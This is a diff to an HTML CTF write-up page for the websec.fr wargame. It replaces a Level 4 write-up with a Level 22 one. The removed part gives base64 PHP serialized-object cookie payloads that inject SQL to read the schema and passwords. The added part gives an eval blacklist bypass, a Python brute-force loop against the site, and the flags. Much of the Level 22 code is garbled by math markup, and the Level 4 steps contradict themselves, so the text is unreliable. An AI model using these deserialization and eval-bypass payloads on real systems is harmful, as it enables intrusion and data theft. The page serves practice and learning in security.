@@ -76,38 +76,53 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-22">WEBSEC Level 22</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
+<p>This is level to reflect on.</p>
 <h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
+<p><code>php
+class A {
+    public $pub;
+    protected $pro ;
+    private $pri;
 
-
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
-
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
+    function __construct($pub, $pro, $pri) {
+        $this->pub = <span class="math"><em>p</em><em>u</em><em>b</em>; </span>this-&gt;pro = <span class="math"><em>p</em><em>r</em><em>o</em>; </span>this-&gt;pri = $pri; } }</p>
+<p>include 'file_containing_the_flag_parts.php'; <span class="math"><em>a</em> = <em>n</em><em>e</em><em>w</em><em>A</em>(</span>f1, <span class="math"><em>f</em>2, </span>f3) //object created ... <span class="math"><em>b</em><em>l</em><em>a</em><em>c</em><em>k</em><em>l</em><em>i</em><em>s</em><em>t</em> = <em>a</em><em>r</em><em>r</em><em>a</em><em>y</em><sub><em>m</em></sub><em>e</em><em>r</em><em>g</em><em>e</em>(</span>funcs_internal, <span class="math"><em>f</em><em>u</em><em>n</em><em>c</em><em>s</em><sub><em>e</em></sub><em>x</em><em>t</em><em>r</em><em>a</em>, </span>funny_chars, <span class="math"><em>v</em><em>a</em><em>r</em><em>i</em><em>a</em><em>b</em><em>l</em><em>e</em><em>s</em>); //<em>a</em><em>r</em><em>r</em><em>a</em><em>y</em><em>w</em><em>i</em><em>t</em><em>h</em><em>t</em><em>h</em><em>e</em><em>p</em><em>o</em><em>t</em><em>e</em><em>n</em><em>t</em><em>i</em><em>a</em><em>l</em>//<em>f</em><em>u</em><em>n</em><em>c</em><em>t</em><em>i</em><em>o</em><em>n</em><em>t</em><em>o</em><em>d</em><em>u</em><em>m</em><em>b</em><em>o</em><em>b</em><em>j</em><em>e</em><em>c</em><em>t</em></span>a ... if (<span class="math">$insecure) {     echo 'Insecure code detected!'; } else {     eval (&quot;echo $</span>code;&quot;); } ?&gt;</code></p>
+<h3 id="walk-through">Walk through</h3>
+<p>STEP 1: Call the <span class="math"><em>b</em><em>l</em><em>a</em><em>c</em><em>k</em><em>l</em><em>i</em><em>s</em><em>t</em><em>a</em><em>r</em><em>r</em><em>a</em><em>y</em><em>w</em><em>i</em><em>t</em><em>h</em><em>s</em><em>i</em><em>n</em><em>c</em><em>e</em>[]<em>i</em><em>s</em><em>b</em><em>l</em><em>o</em><em>c</em><em>k</em><em>e</em><em>d</em>.<em>P</em><em>a</em><em>y</em><em>l</em><em>o</em><em>a</em><em>d</em> : </span>blacklist{1} OUTPUT: func_get_arg</p>
+<p>STEP 2: Give the function of the i'th index of <span class="math"><em>b</em><em>l</em><em>a</em><em>c</em><em>k</em><em>l</em><em>i</em><em>s</em><em>t</em><em>a</em><em>r</em><em>r</em><em>a</em><em>y</em><em>a</em><em>s</em></span>a Payload: <span class="math"><em>b</em><em>l</em><em>a</em><em>c</em><em>k</em><em>l</em><em>i</em><em>s</em><em>t</em>1(</span>a) OUTPUT: func_get_arg($a)</p>
+<p>STEP 3: Find the index in $blacklist array which is var_dump</p>
+<p>from requests import * import sys url = 'http://websec.fr/level22/index.php' i = 0 while True: params = {'code': '$blacklist{{{0}}}'.format(i)} r = get(url, params=params) if r.text.find('var_dump') &gt; -1: print str(i) sys.exit(0) else: i=i+1</p>
+<p>OUTPUT: 579</p>
+<p>STEP 4: <span class="math"><em>b</em><em>l</em><em>a</em><em>c</em><em>k</em><em>l</em><em>i</em><em>s</em><em>t</em>579(</span>a) OUTPUT: object(A)#1 (3) { [&quot;pub&quot;]=&gt; string(17) &quot;WEBSEC{But_I_was_&quot; [&quot;pro&quot;:protected]=&gt; string(18) &quot;told_that_OOP_was_&quot; [&quot;pri&quot;:&quot;A&quot;:private]=&gt; string(22) &quot;flawless_and_stuff_:&lt;}&quot; }</p>
 <h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><strong>FLAG</strong>: <code>WEBSEC{But_I_was_told_that_OOP_was_flawless_and_stuff_:&lt;}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
